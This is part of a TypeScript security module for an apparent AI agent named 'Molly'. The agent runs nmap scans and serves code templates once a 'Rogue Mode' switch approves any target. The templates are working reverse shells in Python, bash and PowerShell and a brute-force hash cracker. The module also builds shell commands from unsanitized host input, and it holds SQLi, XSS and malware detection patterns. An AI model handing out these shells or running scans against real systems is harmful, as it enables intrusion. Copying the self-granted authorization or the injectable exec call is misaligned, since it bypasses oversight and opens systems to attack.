/**
 * @fileOverview Pillar 5: Defense Sentinel — Red Team Operations
 *
 * The best defense is an extremely aggressive offense.
 * Find them before they find you.
 *
 * This module provides Molly with offensive and defensive security capabilities:
 * - Network reconnaissance (nmap integration)
 * - Password auditing (hashcat awareness)
 * - Vulnerability scanning
 * - Threat hunting
 * - Anomaly detection
 *
 * All operations require Rogue Mode authorization or explicit scope.
 * Methodology: We fix the dam, not the leaks.
 *
 * Types are defined in ./sentinel/types.ts for reusability.
 */

// child_process is imported dynamically to avoid bundler issues
import { MollyLogger, generateTraceId } from '@/ai/logger';
import { getRogueMode } from '@/ai/rogue-mode';
import { getStorageRouter } from '@/lib/storage-router';

// Import types from sentinel/types for internal use
import type {
  ScanType,
  ThreatLevel,
  ScanTarget,
  ScanResult,
  PortInfo,
  ServiceInfo,
  VulnInfo,
  ThreatIndicator,
  SentinelState,
  ToolAvailability,
  CodeLanguage,
  CodePurpose,
  CodeForgeRequest,
  CodeForgeResult,
  SentinelStatus,
} from './sentinel/types';

// Lazy-loaded exec function
type ExecAsyncFn = (
  cmd: string,
  opts?: { timeout?: number; maxBuffer?: number }
) => Promise<{ stdout: string; stderr: string }>;
let execAsync: ExecAsyncFn | null = null;

async function getExecAsync(): Promise<ExecAsyncFn | null> {
  if (execAsync) return execAsync;

  // Only works in Node.js environment
  if (typeof process === 'undefined' || !process.versions?.node) {
    return null;
  }

  try {
    const { exec } = await import('child_process');
    const { promisify } = await import('util');
    execAsync = promisify(exec) as ExecAsyncFn;
    return execAsync;
  } catch {
    return null;
  }
}

// ============================================================
// STATE
// ============================================================

let _state: SentinelState = {
  scansCompleted: 0,
  threatsDetected: 0,
  lastScan: 0,
  activeHunts: [],
  recentScans: [],
};

// ============================================================
// TOOL DETECTION
// ============================================================

// NOTE: ToolAvailability is imported from ./sentinel/types

let _tools: ToolAvailability | null = null;

/**
 * Check which security tools are available on the system.
 */
export async function detectAvailableTools(): Promise<ToolAvailability> {
  if (_tools) return _tools;

  const exec = await getExecAsync();
  const checkTool = async (cmd: string): Promise<boolean> => {
    if (!exec) return false;
    try {
      await exec(`which ${cmd}`, { timeout: 5000 });
      return true;
    } catch {
      return false;
    }
  };

  _tools = {
    nmap: await checkTool('nmap'),
    hashcat: await checkTool('hashcat'),
    john: await checkTool('john'),
    hydra: await checkTool('hydra'),
    masscan: await checkTool('masscan'),
    nikto: await checkTool('nikto'),
    sqlmap: await checkTool('sqlmap'),
    metasploit: await checkTool('msfconsole'),
    burp: await checkTool('burpsuite'),
  };

  MollyLogger.info(
    'Defense Sentinel: Tool detection complete',
    'defense-sentinel',
    { tools: _tools },
    generateTraceId()
  );

  return _tools;
}

/**
 * Get list of available offensive tools.
 */
export function getAvailableTools(): string[] {
  if (!_tools) return [];
  return Object.entries(_tools)
    .filter(([, available]) => available)
    .map(([tool]) => tool);
}

// ============================================================
// AUTHORIZATION
// ============================================================

/**
 * Verify authorization for offensive operations.
 * Requires either:
 * 1. Rogue Mode active with matching scope
 * 2. Explicit authorization in target
 */
function verifyAuthorization(target: ScanTarget): {
  authorized: boolean;
  reason: string;
} {
  // Check Rogue Mode first
  const rogueMode = getRogueMode();
  if (rogueMode.isActive()) {
    const mission = rogueMode.getCurrentMission();
    return {
      authorized: true,
      reason: `Rogue Mode active: ${mission?.name || 'mission'}`,
    };
  }

  // Check explicit authorization
  if (target.authorized) {
    return {
      authorized: true,
      reason: target.scope || 'Explicit authorization granted',
    };
  }

  return {
    authorized: false,
    reason:
      'No authorization. Activate Rogue Mode or provide authorized target.',
  };
}

// ============================================================
// NETWORK RECONNAISSANCE
// ============================================================

/**
 * Execute nmap scan against target.
 * The best defense is an extremely aggressive offense.
 */
export async function nmapScan(
  target: ScanTarget,
  scanType: ScanType = 'quick'
): Promise<ScanResult> {
  const traceId = generateTraceId();
  const startTime = Date.now();

  // Verify authorization
  const auth = verifyAuthorization(target);
  if (!auth.authorized) {
    return {
      target: target.host,
      scanType,
      startTime,
      endTime: Date.now(),
      openPorts: [],
      services: [],
      vulnerabilities: [],
      rawOutput: '',
      success: false,
      error: auth.reason,
    };
  }

  // Check if nmap is available
  const tools = await detectAvailableTools();
  if (!tools.nmap) {
    return {
      target: target.host,
      scanType,
      startTime,
      endTime: Date.now(),
      openPorts: [],
      services: [],
      vulnerabilities: [],
      rawOutput: '',
      success: false,
      error: 'nmap not installed. Install with: apt-get install nmap',
    };
  }

  // Build nmap command based on scan type
  let nmapArgs: string;
  switch (scanType) {
    case 'quick':
      nmapArgs = '-T4 -F'; // Fast scan, top 100 ports
      break;
    case 'full':
      nmapArgs = '-p-'; // All 65535 ports
      break;
    case 'stealth':
      nmapArgs = '-sS -T2'; // SYN scan, slower but stealthier
      break;
    case 'service':
      nmapArgs = '-sV -sC'; // Version and script scan
      break;
    case 'vuln':
      nmapArgs = '-sV --script=vuln'; // Vulnerability scripts
      break;
    case 'aggressive':
      nmapArgs = '-A -T4'; // Full enumeration
      break;
  }

  // Add port specification if provided
  if (target.ports) {
    nmapArgs += ` -p ${target.ports}`;
  }

  const command = `nmap ${nmapArgs} ${target.host} -oX -`;

  MollyLogger.info(
    `Defense Sentinel: Starting ${scanType} scan`,
    'defense-sentinel',
    { target: target.host, authorization: auth.reason },
    traceId
  );

  try {
    const exec = await getExecAsync();
    if (!exec) {
      return {
        target: target.host,
        scanType,
        startTime,
        endTime: Date.now(),
        openPorts: [],
        services: [],
        vulnerabilities: [],
        rawOutput: '',
        success: false,
        error: 'child_process not available in this environment',
      };
    }

    const { stdout } = await exec(command, {
      timeout: 300000, // 5 minute timeout
      maxBuffer: 10 * 1024 * 1024, // 10MB buffer
    });

    const result = parseNmapOutput(stdout, target.host, scanType, startTime);

    // Update state
    _state.scansCompleted++;
    _state.lastScan = Date.now();
    _state.recentScans.push({
      target: target.host,
      type: scanType,
      timestamp: Date.now(),
      findings: result.openPorts.length + result.vulnerabilities.length,
    });

    // Keep only last 50 scans
    if (_state.recentScans.length > 50) {
      _state.recentScans = _state.recentScans.slice(-50);
    }

    MollyLogger.info(
      `Defense Sentinel: Scan complete`,
      'defense-sentinel',
      {
        target: target.host,
        openPorts: result.openPorts.length,
        vulns: result.vulnerabilities.length,
      },
      traceId
    );

    // Save state
    saveSentinelState().catch(() => {});

    return result;
  } catch (error) {
    const errorMsg = error instanceof Error ? error.message : String(error);

    MollyLogger.error(
      'Defense Sentinel: Scan failed',
      'defense-sentinel',
      { target: target.host, error: errorMsg },
      error,
      traceId
    );

    return {
      target: target.host,
      scanType,
      startTime,
      endTime: Date.now(),
      openPorts: [],
      services: [],
      vulnerabilities: [],
      rawOutput: '',
      success: false,
      error: errorMsg,
    };
  }
}

/**
 * Parse nmap XML output into structured result.
 */
function parseNmapOutput(
  xml: string,
  target: string,
  scanType: ScanType,
  startTime: number
): ScanResult {
  const openPorts: PortInfo[] = [];
  const services: ServiceInfo[] = [];
  const vulnerabilities: VulnInfo[] = [];

  // Parse ports (simplified regex parsing - in production use xml2js)
  const portMatches = xml.matchAll(
    /<port protocol="(\w+)" portid="(\d+)".*?state="(\w+)".*?(?:service name="([^"]*)".*?(?:version="([^"]*)")?)?/gs
  );

  for (const match of portMatches) {
    const [, protocol, portStr, state, service, version] = match;
    const port = parseInt(portStr, 10);

    if (state === 'open') {
      openPorts.push({
        port,
        protocol: protocol as 'tcp' | 'udp',
        state: 'open',
        service,
      });

      if (service) {
        services.push({
          port,
          service,
          version,
        });
      }
    }
  }

  // Parse vulnerabilities from script output
  const vulnMatches = xml.matchAll(
    /<script id="([^"]*vuln[^"]*)".*?output="([^"]*)"/gs
  );

  for (const match of vulnMatches) {
    const [, scriptId, output] = match;

    // Look for CVE references
    const cveMatch = output.match(/CVE-\d{4}-\d+/);

    if (output.toLowerCase().includes('vulnerable')) {
      vulnerabilities.push({
        id: cveMatch?.[0] || scriptId,
        title: scriptId,
        severity: determineSeverity(output),
        description: output.substring(0, 500),
        exploitable: output.toLowerCase().includes('exploit'),
      });
    }
  }

  return {
    target,
    scanType,
    startTime,
    endTime: Date.now(),
    openPorts,
    services,
    vulnerabilities,
    rawOutput: xml,
    success: true,
  };
}

/**
 * Determine vulnerability severity from description.
 */
function determineSeverity(description: string): ThreatLevel {
  const lower = description.toLowerCase();
  if (lower.includes('critical') || lower.includes('rce')) return 'critical';
  if (lower.includes('high') || lower.includes('exploit')) return 'high';
  if (lower.includes('medium') || lower.includes('moderate')) return 'medium';
  if (lower.includes('low')) return 'low';
  return 'info';
}

// ============================================================
// PASSWORD AUDITING
// ============================================================

// NOTE: HashInfo is imported from ./sentinel/types

/**
 * Identify hash type.
 */
export function identifyHash(hash: string): string {
  const length = hash.length;

  // Common hash patterns
  if (/^\$2[aby]?\$\d{2}\$/.test(hash)) return 'bcrypt';
  if (/^\$6\$/.test(hash)) return 'sha512crypt';
  if (/^\$5\$/.test(hash)) return 'sha256crypt';
  if (/^\$1\$/.test(hash)) return 'md5crypt';
  if (/^\$apr1\$/.test(hash)) return 'apr1-md5';

  // Length-based identification
  if (length === 32 && /^[a-f0-9]+$/i.test(hash)) return 'md5';
  if (length === 40 && /^[a-f0-9]+$/i.test(hash)) return 'sha1';
  if (length === 64 && /^[a-f0-9]+$/i.test(hash)) return 'sha256';
  if (length === 128 && /^[a-f0-9]+$/i.test(hash)) return 'sha512';

  // NTLM
  if (length === 32 && /^[a-f0-9]+$/i.test(hash)) return 'ntlm-or-md5';

  return 'unknown';
}

/**
 * Check password strength against common patterns.
 */
export function auditPasswordStrength(password: string): {
  score: number;
  issues: string[];
  recommendation: string;
} {
  const issues: string[] = [];
  let score = 0;

  // Length checks
  if (password.length < 8) {
    issues.push('Too short (minimum 8 characters)');
  } else if (password.length >= 12) {
    score += 2;
  } else {
    score += 1;
  }

  // Complexity checks
  if (/[a-z]/.test(password)) score += 1;
  if (/[A-Z]/.test(password)) score += 1;
  if (/[0-9]/.test(password)) score += 1;
  if (/[^a-zA-Z0-9]/.test(password)) score += 2;

  // Common patterns (weak)
  const commonPatterns = [
    /^password/i,
    /^123456/,
    /^qwerty/i,
    /^admin/i,
    /^letmein/i,
    /^welcome/i,
    /^monkey/i,
    /^dragon/i,
  ];

  for (const pattern of commonPatterns) {
    if (pattern.test(password)) {
      issues.push('Contains common weak pattern');
      score = Math.max(0, score - 3);
      break;
    }
  }

  // Sequential/repeated characters
  if (/(.)\1{2,}/.test(password)) {
    issues.push('Contains repeated characters');
    score = Math.max(0, score - 1);
  }

  let recommendation: string;
  if (score <= 2) {
    recommendation = 'CRITICAL: Password is very weak. Use a passphrase.';
  } else if (score <= 4) {
    recommendation = 'WEAK: Add more complexity and length.';
  } else if (score <= 6) {
    recommendation = 'MODERATE: Consider using a longer passphrase.';
  } else {
    recommendation = 'STRONG: Good password hygiene.';
  }

  return { score, issues, recommendation };
}

/**
 * Generate hashcat command for a given hash type.
 * Does not execute - returns command for review.
 */
export function generateHashcatCommand(
  hashFile: string,
  hashType: string,
  wordlist: string = '/usr/share/wordlists/rockyou.txt',
  rules?: string
): string {
  // Hashcat mode mapping
  const modes: Record<string, number> = {
    md5: 0,
    sha1: 100,
    sha256: 1400,
    sha512: 1700,
    ntlm: 1000,
    bcrypt: 3200,
    md5crypt: 500,
    sha512crypt: 1800,
    sha256crypt: 7400,
  };

  const mode = modes[hashType] ?? 0;
  let cmd = `hashcat -m ${mode} -a 0 ${hashFile} ${wordlist}`;

  if (rules) {
    cmd += ` -r ${rules}`;
  }

  cmd += ' --force'; // For VMs without OpenCL

  return cmd;
}

// ============================================================
// THREAT HUNTING
// ============================================================

const _threats: ThreatIndicator[] = [];

/**
 * Log a threat indicator.
 */
export function logThreat(threat: Omit<ThreatIndicator, 'timestamp'>): void {
  const indicator: ThreatIndicator = {
    ...threat,
    timestamp: Date.now(),
  };

  _threats.push(indicator);
  _state.threatsDetected++;

  // Keep only last 100 threats
  if (_threats.length > 100) {
    _threats.shift();
  }

  MollyLogger.warn(
    `Defense Sentinel: Threat detected - ${threat.type}`,
    'defense-sentinel',
    { threat: indicator },
    generateTraceId()
  );

  saveSentinelState().catch(() => {});
}

/**
 * Get recent threat indicators.
 */
export function getThreats(
  severity?: ThreatLevel,
  limit: number = 20
): ThreatIndicator[] {
  let filtered = _threats;

  if (severity) {
    filtered = _threats.filter((t) => t.severity === severity);
  }

  return filtered.slice(-limit);
}

/**
 * Check for common attack patterns in logs.
 */
export function analyzeForAttacks(logData: string): ThreatIndicator[] {
  const detected: ThreatIndicator[] = [];

  // SSH brute force pattern
  const sshFailures = (logData.match(/Failed password for/g) || []).length;
  if (sshFailures > 10) {
    detected.push({
      type: 'brute_force',
      severity: 'high',
      source: 'ssh',
      timestamp: Date.now(),
      details: `${sshFailures} failed SSH login attempts detected`,
      mitigated: false,
    });
  }

  // Port scan detection
  const portConnections = (logData.match(/Connection from .* port \d+/g) || [])
    .length;
  if (portConnections > 50) {
    detected.push({
      type: 'port_scan',
      severity: 'medium',
      source: 'network',
      timestamp: Date.now(),
      details: `Possible port scan detected: ${portConnections} connection attempts`,
      mitigated: false,
    });
  }

  // SQL injection patterns
  if (/('|"|\-\-|;|UNION|SELECT|DROP|INSERT|UPDATE|DELETE)/i.test(logData)) {
    detected.push({
      type: 'anomaly',
      severity: 'high',
      source: 'application',
      timestamp: Date.now(),
      details: 'Possible SQL injection attempt detected in logs',
      mitigated: false,
    });
  }

  // Data exfiltration (large outbound)
  const largeOutbound = logData.match(/outbound.*bytes[=:]\s*(\d+)/gi);
  if (largeOutbound) {
    for (const match of largeOutbound) {
      const bytes = parseInt(match.match(/(\d+)/)?.[1] || '0', 10);
      if (bytes > 100_000_000) {
        // 100MB+
        detected.push({
          type: 'exfiltration',
          severity: 'critical',
          source: 'network',
          timestamp: Date.now(),
          details: `Large outbound transfer detected: ${(bytes / 1_000_000).toFixed(1)}MB`,
          mitigated: false,
        });
      }
    }
  }

  return detected;
}

// ============================================================
// SENTINEL STATUS
// ============================================================

/**
 * Get Defense Sentinel status.
 */
export function getSentinelStatus(): {
  active: boolean;
  scansCompleted: number;
  threatsDetected: number;
  lastScan: number;
  availableTools: string[];
  activeHunts: string[];
  recentActivity: SentinelState['recentScans'];
} {
  return {
    active: true,
    scansCompleted: _state.scansCompleted,
    threatsDetected: _state.threatsDetected,
    lastScan: _state.lastScan,
    availableTools: getAvailableTools(),
    activeHunts: _state.activeHunts,
    recentActivity: _state.recentScans.slice(-10),
  };
}

// ============================================================
// PERSISTENCE
// ============================================================

const SENTINEL_COLLECTION = 'agency';
const SENTINEL_DOC_ID = 'defense-sentinel';
let persistenceEnabled = false;
let saveDebounceTimer: ReturnType<typeof setTimeout> | null = null;

async function saveSentinelState(): Promise<void> {
  if (!persistenceEnabled) return;

  if (saveDebounceTimer) {
    clearTimeout(saveDebounceTimer);
  }

  saveDebounceTimer = setTimeout(async () => {
    try {
      const storage = await getStorageRouter();
      await storage.set(SENTINEL_COLLECTION, SENTINEL_DOC_ID, {
        scansCompleted: _state.scansCompleted,
        threatsDetected: _state.threatsDetected,
        lastScan: _state.lastScan,
        recentScans: _state.recentScans,
        savedAt: new Date().toISOString(),
      });
    } catch (err) {
      MollyLogger.warn(
        `[SENTINEL] Failed to save state: ${err instanceof Error ? err.message : String(err)}`,
        'defense-sentinel'
      );
    }
  }, 1000);
}

/**
 * Load Defense Sentinel state from storage.
 */
export async function loadSentinelState(): Promise<number> {
  const traceId = generateTraceId();

  try {
    // Detect available tools on startup
    await detectAvailableTools();

    const storage = await getStorageRouter();
    const doc = await storage.get(SENTINEL_COLLECTION, SENTINEL_DOC_ID);

    if (!doc?.data) {
      persistenceEnabled = true;
      MollyLogger.info(
        'Defense Sentinel initialized — ready for operations',
        'defense-sentinel',
        { tools: getAvailableTools() },
        traceId
      );
      return 0;
    }

    const data = doc.data;

    _state = {
      scansCompleted: (data.scansCompleted as number) || 0,
      threatsDetected: (data.threatsDetected as number) || 0,
      lastScan: (data.lastScan as number) || 0,
      activeHunts: [],
      recentScans: (data.recentScans as SentinelState['recentScans']) || [],
    };

    persistenceEnabled = true;

    MollyLogger.info(
      `Defense Sentinel restored: ${_state.scansCompleted} scans, ${_state.threatsDetected} threats`,
      'defense-sentinel',
      { tools: getAvailableTools() },
      traceId
    );

    return _state.scansCompleted;
  } catch (error) {
    MollyLogger.warn(
      'Could not load Sentinel state, starting fresh',
      'defense-sentinel',
      { error: error instanceof Error ? error.message : String(error) },
      traceId
    );

    persistenceEnabled = true;
    return 0;
  }
}

// ============================================================
// CODEFORGE — Offensive & Defensive Code Generation
// ============================================================

// NOTE: CodeLanguage, CodePurpose, CodeForgeRequest, and CodeForgeResult
// are imported from ./sentinel/types - do not redefine them here.

/**
 * Security code templates Molly can use as building blocks.
 */
const CODE_TEMPLATES: Record<string, Record<CodeLanguage, string>> = {
  port_scanner: {
    python: `#!/usr/bin/env python3
import socket
import concurrent.futures

def scan_port(host, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            result = s.connect_ex((host, port))
            return port if result == 0 else None
    except:
        return None

def scan_host(host, ports=range(1, 1025)):
    open_ports = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        futures = {executor.submit(scan_port, host, p): p for p in ports}
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                open_ports.append(result)
    return sorted(open_ports)

if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    print(f"Scanning {target}...")
    for port in scan_host(target):
        print(f"  Port {port} OPEN")`,
    bash: `#!/bin/bash
HOST="\${1:-127.0.0.1}"
for port in {1..1024}; do
    (echo >/dev/tcp/$HOST/$port) 2>/dev/null && echo "Port $port OPEN"
done`,
    javascript: '',
    typescript: '',
    powershell: '',
    c: '',
    cpp: '',
    rust: '',
    go: '',
    ruby: '',
    php: '',
    java: '',
    sql: '',
    csharp: '',
    assembly: '',
  },

  reverse_shell: {
    python: `#!/usr/bin/env python3
# AUTHORIZED USE ONLY — Rogue Mode Required
import socket,subprocess,os
def connect(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])`,
    bash: `#!/bin/bash
# AUTHORIZED USE ONLY — Rogue Mode Required
bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1`,
    javascript: '',
    typescript: '',
    powershell: `# AUTHORIZED USE ONLY — Rogue Mode Required
$client = New-Object System.Net.Sockets.TCPClient($RHOST,$RPORT)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()`,
    c: '',
    cpp: '',
    rust: '',
    go: '',
    ruby: '',
    php: '',
    java: '',
    sql: '',
    csharp: '',
    assembly: '',
  },

  sql_injection_detector: {
    python: `#!/usr/bin/env python3
import re

SQLI_PATTERNS = [
    r"('|\")(\\s)*(or|and)(\\s)+.*=",
    r"union(\\s)+select",
    r"(;|'|\")\\s*(drop|delete|update|insert)",
    r"--\\s*$",
    r"/\\*.*\\*/",
    r"exec(\\s)+xp_",
    r"WAITFOR(\\s)+DELAY",
]

def detect_sqli(input_str):
    threats = []
    for pattern in SQLI_PATTERNS:
        if re.search(pattern, input_str, re.IGNORECASE):
            threats.append(pattern)
    return threats

def sanitize(input_str):
    # Basic escaping - use parameterized queries in production
    return input_str.replace("'", "''").replace(";", "")`,
    javascript: `const SQLI_PATTERNS = [
  /('|")(\\s)*(or|and)(\\s)+.*=/i,
  /union(\\s)+select/i,
  /(;|'|")\\s*(drop|delete|update|insert)/i,
  /--\\s*$/,
  /\\/\\*.*\\*\\//,
];

function detectSQLi(input) {
  return SQLI_PATTERNS.filter(p => p.test(input));
}

function sanitize(input) {
  return input.replace(/'/g, "''").replace(/;/g, "");
}`,
    typescript: '',
    bash: '',
    powershell: '',
    c: '',
    cpp: '',
    rust: '',
    go: '',
    ruby: '',
    php: '',
    java: '',
    sql: '',
    csharp: '',
    assembly: '',
  },

  xss_sanitizer: {
    javascript: `function sanitizeHTML(str) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;',
  };
  return str.replace(/[&<>"'/]/g, c => map[c]);
}

function detectXSS(input) {
  const patterns = [
    /<script[^>]*>/i,
    /javascript:/i,
    /on\\w+\\s*=/i,
    /<iframe/i,
    /<embed/i,
    /<object/i,
  ];
  return patterns.some(p => p.test(input));
}`,
    typescript: `export function sanitizeHTML(str: string): string {
  const map: Record<string, string> = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;',
  };
  return str.replace(/[&<>"'/]/g, c => map[c] || c);
}

export function detectXSS(input: string): boolean {
  const patterns = [
    /<script[^>]*>/i,
    /javascript:/i,
    /on\\w+\\s*=/i,
    /<iframe/i,
  ];
  return patterns.some(p => p.test(input));
}`,
    python: '',
    bash: '',
    powershell: '',
    c: '',
    cpp: '',
    rust: '',
    go: '',
    ruby: '',
    php: '',
    java: '',
    sql: '',
    csharp: '',
    assembly: '',
  },

  password_cracker: {
    python: `#!/usr/bin/env python3
# AUTHORIZED USE ONLY — Rogue Mode Required
import hashlib
import itertools
import string

def crack_md5(target_hash, max_length=6, charset=string.ascii_lowercase):
    for length in range(1, max_length + 1):
        for combo in itertools.product(charset, repeat=length):
            candidate = ''.join(combo)
            if hashlib.md5(candidate.encode()).hexdigest() == target_hash:
                return candidate
    return None

def crack_with_wordlist(target_hash, wordlist_path, hash_func=hashlib.md5):
    with open(wordlist_path, 'r', errors='ignore') as f:
        for word in f:
            word = word.strip()
            if hash_func(word.encode()).hexdigest() == target_hash:
                return word
    return None`,
    bash: '',
    javascript: '',
    typescript: '',
    powershell: '',
    c: '',
    cpp: '',
    rust: '',
    go: '',
    ruby: '',
    php: '',
    java: '',
    sql: '',
    csharp: '',
    assembly: '',
  },
};

/**
 * Forge security code — offensive or defensive.
 * Offensive code requires Rogue Mode authorization.
 */
export function forgeCode(request: CodeForgeRequest): CodeForgeResult {
  const { purpose, language, description } = request;
  const warnings: string[] = [];

  // Check authorization for offensive code
  const offensivePurposes: CodePurpose[] = ['exploit', 'payload'];
  if (offensivePurposes.includes(purpose)) {
    const rogueMode = getRogueMode();
    if (!rogueMode.isActive()) {
      return {
        success: false,
        language,
        purpose,
        warnings: [],
        error:
          'Offensive code generation requires Rogue Mode. Activate with authorization.',
      };
    }
    warnings.push('AUTHORIZED USE ONLY — Generated under Rogue Mode');
  }

  // Try to find a matching template
  const templateKey = findTemplateKey(description, purpose);
  if (templateKey && CODE_TEMPLATES[templateKey]?.[language]) {
    const code = CODE_TEMPLATES[templateKey][language];
    return {
      success: true,
      code,
      language,
      purpose,
      warnings,
      explanation: `Generated ${templateKey} template for ${purpose}`,
    };
  }

  // If no template, provide guidance for code generation
  // In a full implementation, this would call molly.generate() to write custom code
  return {
    success: true,
    code: generateCodeSkeleton(purpose, language, description),
    language,
    purpose,
    warnings,
    explanation: `Generated skeleton for: ${description}. Customize as needed.`,
  };
}

/**
 * Find the best template key for a request.
 */
function findTemplateKey(
  description: string,
  _purpose: CodePurpose
): string | null {
  const lower = description.toLowerCase();

  if (lower.includes('port') && lower.includes('scan')) return 'port_scanner';
  if (lower.includes('reverse') && lower.includes('shell'))
    return 'reverse_shell';
  if (lower.includes('sql') && lower.includes('inject'))
    return 'sql_injection_detector';
  if (lower.includes('xss') || lower.includes('cross-site'))
    return 'xss_sanitizer';
  if (lower.includes('password') && lower.includes('crack'))
    return 'password_cracker';

  return null;
}

/**
 * Generate a code skeleton when no template matches.
 */
function generateCodeSkeleton(
  purpose: CodePurpose,
  language: CodeLanguage,
  description: string
): string {
  const header = {
    python: `#!/usr/bin/env python3
"""
Purpose: ${purpose}
Description: ${description}
Generated by Molly Defense Sentinel
"""

`,
    javascript: `/**
 * Purpose: ${purpose}
 * Description: ${description}
 * Generated by Molly Defense Sentinel
 */

`,
    typescript: `/**
 * Purpose: ${purpose}
 * Description: ${description}
 * Generated by Molly Defense Sentinel
 */

`,
    bash: `#!/bin/bash
# Purpose: ${purpose}
# Description: ${description}
# Generated by Molly Defense Sentinel

`,
    powershell: `<#
Purpose: ${purpose}
Description: ${description}
Generated by Molly Defense Sentinel
#>

`,
    c: `/*
 * Purpose: ${purpose}
 * Description: ${description}
 * Generated by Molly Defense Sentinel
 */

#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    // TODO: Implement ${description}
    return 0;
}
`,
    cpp: `/*
 * Purpose: ${purpose}
 * Description: ${description}
 * Generated by Molly Defense Sentinel
 */

#include <iostream>

int main(int argc, char *argv[]) {
    // TODO: Implement ${description}
    return 0;
}
`,
    rust: `//! Purpose: ${purpose}
//! Description: ${description}
//! Generated by Molly Defense Sentinel

fn main() {
    // TODO: Implement ${description}
}
`,
    go: `// Purpose: ${purpose}
// Description: ${description}
// Generated by Molly Defense Sentinel

package main

import "fmt"

func main() {
    // TODO: Implement ${description}
    fmt.Println("Molly Defense Sentinel")
}
`,
    ruby: `#!/usr/bin/env ruby
# Purpose: ${purpose}
# Description: ${description}
# Generated by Molly Defense Sentinel

`,
    php: `<?php
/**
 * Purpose: ${purpose}
 * Description: ${description}
 * Generated by Molly Defense Sentinel
 */

`,
    java: `/**
 * Purpose: ${purpose}
 * Description: ${description}
 * Generated by Molly Defense Sentinel
 */
public class SecurityTool {
    public static void main(String[] args) {
        // TODO: Implement ${description}
    }
}
`,
    sql: `-- Purpose: ${purpose}
-- Description: ${description}
-- Generated by Molly Defense Sentinel

`,
    assembly: `; Purpose: ${purpose}
; Description: ${description}
; Generated by Molly Defense Sentinel

section .text
global _start

_start:
    ; TODO: Implement ${description}
    mov eax, 1
    xor ebx, ebx
    int 0x80
`,
  };

  return header[language] || `// Purpose: ${purpose}\n// ${description}\n`;
}

/**
 * Analyze code for security vulnerabilities.
 * Molly reads and understands attacks.
 */
export function analyzeCode(
  code: string,
  _language: CodeLanguage
): {
  vulnerabilities: Array<{
    type: string;
    severity: ThreatLevel;
    line?: number;
    description: string;
    fix?: string;
  }>;
  isMalicious: boolean;
  malwareIndicators: string[];
} {
  const vulnerabilities: Array<{
    type: string;
    severity: ThreatLevel;
    line?: number;
    description: string;
    fix?: string;
  }> = [];
  const malwareIndicators: string[] = [];

  // Common vulnerability patterns
  const vulnPatterns = [
    {
      pattern: /eval\s*\(/gi,
      type: 'Code Injection',
      severity: 'critical' as ThreatLevel,
      description: 'eval() can execute arbitrary code',
      fix: 'Use safer alternatives like JSON.parse() or specific parsers',
    },
    {
      pattern: /exec\s*\(/gi,
      type: 'Command Injection',
      severity: 'critical' as ThreatLevel,
      description: 'exec() can execute system commands',
      fix: 'Sanitize inputs and use parameterized commands',
    },
    {
      pattern: /password\s*=\s*["'][^"']+["']/gi,
      type: 'Hardcoded Credential',
      severity: 'high' as ThreatLevel,
      description: 'Hardcoded password detected',
      fix: 'Use environment variables or secure vaults',
    },
    {
      pattern: /md5\s*\(/gi,
      type: 'Weak Cryptography',
      severity: 'medium' as ThreatLevel,
      description: 'MD5 is cryptographically broken',
      fix: 'Use SHA-256 or bcrypt for passwords',
    },
    {
      pattern: /innerHTML\s*=/gi,
      type: 'XSS Vector',
      severity: 'high' as ThreatLevel,
      description: 'innerHTML can execute scripts',
      fix: 'Use textContent or sanitize HTML',
    },
    {
      pattern: /SELECT\s+\*\s+FROM.*WHERE.*\+/gi,
      type: 'SQL Injection',
      severity: 'critical' as ThreatLevel,
      description: 'String concatenation in SQL query',
      fix: 'Use parameterized queries',
    },
    {
      pattern: /pickle\.load/gi,
      type: 'Deserialization',
      severity: 'critical' as ThreatLevel,
      description: 'Pickle can deserialize malicious objects',
      fix: 'Use JSON or validate pickle sources',
    },
    {
      pattern: /chmod\s+777/gi,
      type: 'Insecure Permissions',
      severity: 'medium' as ThreatLevel,
      description: 'World-writable permissions',
      fix: 'Use least-privilege permissions (e.g., 755 or 644)',
    },
  ];

  // Malware indicators
  const malwarePatterns = [
    { pattern: /reverse.*shell/gi, indicator: 'Reverse shell code' },
    { pattern: /keylog/gi, indicator: 'Keylogger functionality' },
    { pattern: /c2.*server|command.*control/gi, indicator: 'C2 communication' },
    { pattern: /exfiltrat/gi, indicator: 'Data exfiltration' },
    { pattern: /privilege.*escalat/gi, indicator: 'Privilege escalation' },
    {
      pattern: /persistence|autorun|startup/gi,
      indicator: 'Persistence mechanism',
    },
    {
      pattern: /anti.*debug|vm.*detect/gi,
      indicator: 'Anti-analysis technique',
    },
    { pattern: /ransom|encrypt.*files/gi, indicator: 'Ransomware behavior' },
  ];

  // Check for vulnerabilities
  for (const { pattern, type, severity, description, fix } of vulnPatterns) {
    const matches = code.match(pattern);
    if (matches) {
      // Find line number
      const lines = code.split('\n');
      let lineNum: number | undefined;
      for (let i = 0; i < lines.length; i++) {
        if (pattern.test(lines[i])) {
          lineNum = i + 1;
          break;
        }
      }

      vulnerabilities.push({ type, severity, line: lineNum, description, fix });
    }
  }

  // Check for malware indicators
  for (const { pattern, indicator } of malwarePatterns) {
    if (pattern.test(code)) {
      malwareIndicators.push(indicator);
    }
  }

  return {
    vulnerabilities,
